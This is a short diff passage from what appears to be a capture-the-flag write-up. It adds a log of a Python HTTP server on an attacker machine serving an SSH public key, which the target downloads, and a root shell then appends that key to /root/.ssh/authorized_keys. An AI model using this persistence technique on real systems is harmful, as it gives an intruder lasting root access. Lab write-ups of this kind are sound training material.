@@ -328,6 +328,13 @@ kali-rsa.pub        100%[===================>]      91  --.-KB/s    in 0s
 ```
 
 ```bash
+$ python3 -m http.server 9090
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.10.11.128 - - [18/May/2024 17:27:33] "GET /kali-rsa.pub HTTP/1.1" 200 -
+10.10.11.128 - - [18/May/2024 17:28:33] "GET /kali-rsa.pub HTTP/1.1" 200 -
+```
+
+```bash
 root@union:~# cat kali-rsa.pub >> /root/.ssh/authorized_keys
 cat kali-rsa.pub >> /root/.ssh/authorized_keys
 
